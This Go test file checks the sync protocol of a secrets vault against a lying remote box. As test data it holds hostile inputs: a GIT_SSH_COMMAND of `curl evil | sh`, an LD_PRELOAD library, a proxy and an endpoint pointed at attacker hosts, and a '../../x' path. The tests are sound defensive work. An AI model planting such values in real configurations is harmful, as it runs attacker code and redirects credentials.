package boxsync

import (
	"bytes"
	"errors"
	"io"
	"path/filepath"
	"slices"
	"strings"
	"sync"
	"testing"

	"github.com/magroski/blindfold/internal/vault"
)

const (
	apiKey   = "es-api-key-do-not-leak"
	apiToken = "second-secret-do-not-leak"
)

// newVault creates an initialized vault with a master key of its own, as on a
// separate box.
func newVault(t *testing.T) *vault.Vault {
	t.Helper()
	dir := t.TempDir()
	t.Setenv("BLINDFOLD_KEK_FILE", filepath.Join(dir, "kek"))
	t.Setenv("BLINDFOLD_PASSPHRASE_FILE", "")
	t.Setenv("BLINDFOLD_PASSPHRASE", "")
	v, err := vault.Open(filepath.Join(dir, "vault"))
	if err != nil {
		t.Fatal(err)
	}
	if err := v.Init(); err != nil {
		t.Fatal(err)
	}
	return v
}

func bundle() vault.Entry {
	return vault.Entry{
		Name: "cdp-es", Description: "candidate cluster", Tags: []string{"cdp"},
		Vars: []vault.Var{
			{Name: "ES_ENDPOINT", Value: "https://logs.internal"},
			{Name: "ES_API_KEY", Secret: true},
			{Name: "ES_TOKEN", Secret: true},
		},
	}
}

func put(t *testing.T, v *vault.Vault, e vault.Entry, values map[string]string) {
	t.Helper()
	if err := v.Put(e, values); err != nil {
		t.Fatal(err)
	}
}

// served records what the box's server reported, for audit assertions.
type served struct {
	mu     sync.Mutex
	events []Access
}

func (s *served) record(a Access) {
	s.mu.Lock()
	defer s.mu.Unlock()
	s.events = append(s.events, a)
}

// connectTo runs Serve on box over in-memory pipes and returns a client session,
// the bytes of both directions, and the server's access log.
func connectTo(t *testing.T, box *vault.Vault) (*Session, *bytes.Buffer, *served) {
	t.Helper()
	toServer, fromClient := io.Pipe()
	toClient, fromServer := io.Pipe()
	var wire bytes.Buffer
	var wireMu sync.Mutex
	record := func(w io.Writer) io.Writer {
		return writerFunc(func(p []byte) (int, error) {
			wireMu.Lock()
			wire.Write(p)
			wireMu.Unlock()
			return w.Write(p)
		})
	}

	log := &served{}
	done := make(chan error, 1)
	go func() {
		err := Serve(box, toServer, record(fromServer), "test", log.record)
		fromServer.Close()
		done <- err
	}()
	session, err := Connect(toClient, record(fromClient), "test")
	if err != nil {
		t.Fatal(err)
	}
	t.Cleanup(func() {
		fromClient.Close()
		if err := <-done; err != nil {
			t.Errorf("Serve: %v", err)
		}
	})
	return session, &wire, log
}

type writerFunc func([]byte) (int, error)

func (f writerFunc) Write(p []byte) (int, error) { return f(p) }

func TestPushCopiesWholeEntryUnderTheBoxKey(t *testing.T) {
	local, box := newVault(t), newVault(t)
	put(t, local, bundle(), map[string]string{"ES_API_KEY": apiKey, "ES_TOKEN": apiToken})
	session, wire, log := connectTo(t, box)

	results, err := session.Push(local, []string{"cdp-es"}, false)
	if err != nil || len(results) != 1 || results[0].Outcome != Created {
		t.Fatalf("Push = %+v, %v", results, err)
	}

	got, ok := box.Get("cdp-es")
	if !ok || got.Description != "candidate cluster" || !got.HasTag("cdp") || len(got.Vars) != 3 {
		t.Fatalf("box entry = %+v", got)
	}
	values, err := box.Unseal("cdp-es")
	if err != nil || values["ES_API_KEY"] != apiKey || values["ES_TOKEN"] != apiToken {
		t.Errorf("box unsealed %v, %v", values, err)
	}
	if strings.Contains(wire.String(), apiKey) || strings.Contains(wire.String(), apiToken) {
		t.Error("a value crossed the wire in plaintext")
	}
	if len(log.events) != 1 || log.events[0].Op != OpPush || log.events[0].Entry != "cdp-es" {
		t.Errorf("server reported %+v", log.events)
	}
}

func TestPushRefusesConflictUnlessOverwrite(t *testing.T) {
	local, box := newVault(t), newVault(t)
	put(t, local, bundle(), map[string]string{"ES_API_KEY": "rotated", "ES_TOKEN": apiToken})
	put(t, box, bundle(), map[string]string{"ES_API_KEY": "stale", "ES_TOKEN": apiToken})
	session, _, _ := connectTo(t, box)

	results, err := session.Push(local, []string{"cdp-es"}, false)
	if err != nil || results[0].Outcome != Conflict {
		t.Fatalf("Push without overwrite = %+v, %v", results, err)
	}
	if values, _ := box.Unseal("cdp-es"); values["ES_API_KEY"] != "stale" {
		t.Error("a conflicting entry was replaced without overwrite")
	}

	results, err = session.Push(local, []string{"cdp-es"}, true)
	if err != nil || results[0].Outcome != Updated {
		t.Fatalf("Push with overwrite = %+v, %v", results, err)
	}
	if values, _ := box.Unseal("cdp-es"); values["ES_API_KEY"] != "rotated" {
		t.Error("overwrite did not replace the value")
	}
}

func TestPushEqualEntryIsUnchanged(t *testing.T) {
	local, box := newVault(t), newVault(t)
	put(t, local, bundle(), map[string]string{"ES_API_KEY": apiKey, "ES_TOKEN": apiToken})
	put(t, box, bundle(), map[string]string{"ES_API_KEY": apiKey, "ES_TOKEN": apiToken})
	session, _, _ := connectTo(t, box)

	results, err := session.Push(local, []string{"cdp-es"}, false)
	if err != nil || results[0].Outcome != Unchanged {
		t.Errorf("Push of an equal entry = %+v, %v", results, err)
	}
}

func TestPullCopiesHere(t *testing.T) {
	local, box := newVault(t), newVault(t)
	put(t, box, bundle(), map[string]string{"ES_API_KEY": apiKey, "ES_TOKEN": apiToken})
	session, wire, log := connectTo(t, box)

	results, err := session.Pull(local, []string{"cdp-es"}, false)
	if err != nil || results[0].Outcome != Created {
		t.Fatalf("Pull = %+v, %v", results, err)
	}
	if values, err := local.Unseal("cdp-es"); err != nil || values["ES_TOKEN"] != apiToken {
		t.Errorf("local unsealed %v, %v", values, err)
	}
	if strings.Contains(wire.String(), apiToken) {
		t.Error("a value crossed the wire in plaintext")
	}
	if len(log.events) != 1 || log.events[0].Op != OpPull {
		t.Errorf("server reported %+v", log.events)
	}

	if _, err := session.Pull(local, []string{"nope"}, false); err == nil || !strings.Contains(err.Error(), "cdp-es") {
		t.Errorf("Pull of an unknown name = %v, want one listing what exists", err)
	}
}

func TestStatusComparesWithoutValues(t *testing.T) {
	local, box := newVault(t), newVault(t)
	same := vault.Entry{Name: "same", Vars: []vault.Var{{Name: "A", Secret: true}}}
	differs := vault.Entry{Name: "differs", Vars: []vault.Var{{Name: "B", Secret: true}}}
	put(t, local, same, map[string]string{"A": "1"})
	put(t, local, differs, map[string]string{"B": "b-value-here"})
	put(t, local, vault.Entry{Name: "only-here", Vars: []vault.Var{{Name: "C", Value: "x"}}}, nil)
	put(t, box, same, map[string]string{"A": "1"})
	put(t, box, differs, map[string]string{"B": "b-value-there"})
	put(t, box, vault.Entry{Name: "only-there", Vars: []vault.Var{{Name: "D", Value: "y"}}}, nil)
	session, wire, _ := connectTo(t, box)

	states, err := session.Status(local)
	if err != nil {
		t.Fatal(err)
	}
	want := map[string]State{"same": Equal, "differs": Differs, "only-here": Missing, "only-there": OnlyThere}
	for name, state := range want {
		if states[name] != state {
			t.Errorf("%s = %v, want %v", name, states[name], state)
		}
	}
	if strings.Contains(wire.String(), "b-value-") {
		t.Error("a value crossed the wire")
	}
}

// Every failure on the box arrives as an error naming the cause, and the
// session survives it.
func TestServerErrorsArriveAsErrors(t *testing.T) {
	local := newVault(t)
	put(t, local, bundle(), map[string]string{"ES_API_KEY": apiKey, "ES_TOKEN": apiToken})

	dir := t.TempDir()
	uninitialized, err := vault.Open(filepath.Join(dir, "never-initialized"))
	if err != nil {
		t.Fatal(err)
	}
	session, _, _ := connectTo(t, uninitialized)

	_, err = session.Push(local, []string{"cdp-es"}, false)
	if err == nil || !strings.Contains(err.Error(), "init") {
		t.Errorf("Push to an uninitialized box = %v, want a hint to run init", err)
	}
	if _, err := session.Status(local); err == nil || !strings.Contains(err.Error(), "init") {
		t.Errorf("Status of an uninitialized box = %v", err)
	}
}

func TestPushNamesAreResolvedHere(t *testing.T) {
	local, box := newVault(t), newVault(t)
	session, _, _ := connectTo(t, box)
	if _, err := session.Push(local, []string{"missing"}, false); err == nil {
		t.Error("pushing an entry this vault does not hold succeeded")
	}
	if names := box.List(); !slices.Equal(entryNames(names), nil) {
		t.Errorf("box changed: %v", names)
	}
}

func entryNames(entries []vault.Entry) []string {
	var names []string
	for _, e := range entries {
		names = append(names, e.Name)
	}
	return names
}

// A box answering a pull with more than was asked for — a planted entry, or a
// replacement riding along with a confirmed one — is refused whole.
func TestPullStoresOnlyWhatWasAskedFor(t *testing.T) {
	local := newVault(t)
	put(t, local, vault.Entry{Name: "victim", Vars: []vault.Var{{Name: "URL", Value: "https://real"}}}, nil)

	toServer, fromClient := io.Pipe()
	toClient, fromServer := io.Pipe()
	defer fromClient.Close()
	go func() {
		defer fromServer.Close()
		ch, err := Accept(toServer, fromServer, "evil")
		if err != nil {
			return
		}
		var req request
		if ch.Receive(&req) != nil {
			return
		}
		_ = ch.Send(response{Entries: []Credential{
			{Entry: vault.Entry{Name: "asked", Vars: []vault.Var{{Name: "A", Value: "1"}}}},
			{Entry: vault.Entry{Name: "planted", Vars: []vault.Var{{Name: "HTTPS_PROXY", Value: "http://evil"}}}},
			{Entry: vault.Entry{Name: "victim", Vars: []vault.Var{{Name: "URL", Value: "https://evil"}}}},
		}})
	}()
	session, err := Connect(toClient, fromClient, "test")
	if err != nil {
		t.Fatal(err)
	}

	if _, err := session.Pull(local, []string{"asked"}, true); err == nil {
		t.Error("a pull answered with unrequested entries succeeded")
	}
	for _, name := range []string{"asked", "planted"} {
		if _, ok := local.Get(name); ok {
			t.Errorf("%s was stored", name)
		}
	}
	if victim, _ := local.Get("victim"); victim.Vars[0].Value != "https://real" {
		t.Error("an unrequested entry was replaced")
	}
}

// liar is a box that answers every request with resp, whatever was asked.
func liar(t *testing.T, resp response) *Session {
	t.Helper()
	toServer, fromClient := io.Pipe()
	toClient, fromServer := io.Pipe()
	t.Cleanup(func() { fromClient.Close() })
	go func() {
		defer fromServer.Close()
		ch, err := Accept(toServer, fromServer, "evil")
		if err != nil {
			return
		}
		for {
			var req request
			if ch.Receive(&req) != nil || ch.Send(resp) != nil {
				return
			}
		}
	}()
	session, err := Connect(toClient, fromClient, "test")
	if err != nil {
		t.Fatal(err)
	}
	return session
}

// A box cannot report on entries it was never sent: they would be audited,
// and offered for overwrite in the picker.
func TestPushTrustsOnlyResultsForWhatWasSent(t *testing.T) {
	local := newVault(t)
	put(t, local, bundle(), map[string]string{"ES_API_KEY": apiKey, "ES_TOKEN": apiToken})
	session := liar(t, response{Results: []Result{
		{Name: "cdp-es", Outcome: Created},
		{Name: "never-sent", Outcome: Conflict},
	}})

	if results, err := session.Push(local, []string{"cdp-es"}, false); err == nil {
		t.Errorf("results for an entry never sent were accepted: %+v", results)
	}
}

// An entry the box leaves out of its answer is a failure, not silence.
func TestUnansweredEntriesFail(t *testing.T) {
	local := newVault(t)
	put(t, local, bundle(), map[string]string{"ES_API_KEY": apiKey, "ES_TOKEN": apiToken})
	session := liar(t, response{})

	pushed, err := session.Push(local, []string{"cdp-es"}, false)
	if err != nil || len(pushed) != 1 || pushed[0].Outcome != Failed {
		t.Errorf("unanswered push = %+v, %v; want one failure", pushed, err)
	}
	pulled, err := session.Pull(local, []string{"elsewhere"}, false)
	if err != nil || len(pulled) != 1 || pulled[0].Outcome != Failed {
		t.Errorf("unanswered pull = %+v, %v; want one failure", pulled, err)
	}
}

// A copy is whole: one missing a value for a secret it declares is refused,
// so a box cannot keep a local secret under an endpoint of its choosing.
func TestCopyMissingASecretIsRefused(t *testing.T) {
	local := newVault(t)
	put(t, local, bundle(), map[string]string{"ES_API_KEY": apiKey, "ES_TOKEN": apiToken})
	repointed := bundle()
	repointed.Vars[0].Value = "https://attacker.example"
	session := liar(t, response{Entries: []Credential{{Entry: repointed}}})

	results, err := session.Pull(local, []string{"cdp-es"}, true)
	if err != nil || len(results) != 1 || results[0].Outcome != Failed {
		t.Errorf("pull = %+v, %v; want one failure", results, err)
	}
	if e, _ := local.Get("cdp-es"); e.Vars[0].Value != "https://logs.internal" {
		t.Errorf("the endpoint was repointed to %s", e.Vars[0].Value)
	}
}

// A copied entry may not declare a variable that makes programs load code: a
// box could otherwise turn a credential into code run by the next exec here,
// and this machine could do the same to a box.
func TestCopiesRefuseCodeLoadingVariables(t *testing.T) {
	planted := vault.Entry{Name: "stripe", Vars: []vault.Var{
		{Name: "STRIPE_KEY", Secret: true},
		{Name: "GIT_SSH_COMMAND", Value: "sh -c 'curl evil | sh'"},
	}}
	local := newVault(t)
	session := liar(t, response{Entries: []Credential{
		{Entry: planted, Values: map[string][]byte{"STRIPE_KEY": []byte("sk")}},
	}})
	pulled, err := session.Pull(local, []string{"stripe"}, false)
	if err != nil || len(pulled) != 1 || pulled[0].Outcome != Failed {
		t.Errorf("pull = %+v, %v; want one failure", pulled, err)
	}
	if _, ok := local.Get("stripe"); ok {
		t.Error("an entry declaring GIT_SSH_COMMAND was stored")
	}

	sender, box := newVault(t), newVault(t)
	put(t, sender, vault.Entry{Name: "lib", Vars: []vault.Var{{Name: "LD_PRELOAD", Value: "/tmp/x.so"}}}, nil)
	pushed, err := connectToBox(t, box).Push(sender, []string{"lib"}, false)
	if err != nil || len(pushed) != 1 || pushed[0].Outcome != Failed {
		t.Errorf("push = %+v, %v; want one failure", pushed, err)
	}
	if _, ok := box.Get("lib"); ok {
		t.Error("an entry declaring LD_PRELOAD was stored on the box")
	}
}

// Values travel as bytes: one that is not valid UTF-8 arrives intact, and two
// that differ only there compare as different.
func TestValuesTravelAsBytes(t *testing.T) {
	const raw = "pass\xff\xfeword"
	latin := vault.Entry{Name: "latin", Vars: []vault.Var{{Name: "PW", Secret: true}}}
	local, box := newVault(t), newVault(t)
	put(t, local, latin, map[string]string{"PW": raw})
	session := connectToBox(t, box)

	if _, err := session.Push(local, []string{"latin"}, false); err != nil {
		t.Fatal(err)
	}
	if got, err := box.UnsealVar("latin", "PW"); err != nil || got != raw {
		t.Errorf("the box holds %q, %v; want %q", got, err, raw)
	}

	put(t, local, latin, map[string]string{"PW": "pw\xe4"})
	put(t, box, latin, map[string]string{"PW": "pw\xe5"})
	if states, err := session.Status(local); err != nil || states["latin"] != Differs {
		t.Errorf("status = %v, %v; want latin to differ", states, err)
	}
}

// What a box reports is checked: an entry name no vault would accept, or an
// outcome that is not one of the five, is refused.
func TestBoxReportsAreValidated(t *testing.T) {
	local := newVault(t)
	put(t, local, bundle(), map[string]string{"ES_API_KEY": apiKey, "ES_TOKEN": apiToken})

	if _, err := liar(t, response{Digests: []entryDigest{{Name: "../../x"}}}).Status(local); err == nil {
		t.Error("a status naming ../../x was accepted")
	}
	session := liar(t, response{Results: []Result{{Name: "cdp-es", Outcome: "pwned"}}})
	if _, err := session.Push(local, []string{"cdp-es"}, false); err == nil {
		t.Error("an outcome that is not one of the five was accepted")
	}
}

// The box audits every entry it was sent, stored or not: a refused push
// still handed it the values.
func TestBoxAuditsEveryReceivedEntry(t *testing.T) {
	local, box := newVault(t), newVault(t)
	put(t, local, bundle(), map[string]string{"ES_API_KEY": apiKey, "ES_TOKEN": apiToken})
	put(t, box, bundle(), map[string]string{"ES_API_KEY": "other", "ES_TOKEN": apiToken})
	session, _, log := connectTo(t, box)

	if results, err := session.Push(local, []string{"cdp-es"}, false); err != nil || results[0].Outcome != Conflict {
		t.Fatalf("push = %+v, %v; want a conflict", results, err)
	}
	log.mu.Lock()
	defer log.mu.Unlock()
	if len(log.events) != 1 || log.events[0].Entry != "cdp-es" || log.events[0].Outcome != Conflict {
		t.Errorf("box audit = %+v, want the refused push", log.events)
	}
}

// connectToBox is connectTo when only the session matters.
func connectToBox(t *testing.T, box *vault.Vault) *Session {
	t.Helper()
	session, _, _ := connectTo(t, box)
	return session
}

// A box cannot make this side buffer without end: an oversized frame ends the
// session.
func TestChannelRefusesOversizedFrames(t *testing.T) {
	_, server, _ := connect(t, "v1", "v1")
	deliver(server, strings.Repeat("A", maxFrameSize+1)+"\n")
	var got message
	if err := server.Receive(&got); !errors.Is(err, errFrameTooLarge) {
		t.Errorf("Receive of an oversized frame = %v, want errFrameTooLarge", err)
	}
}
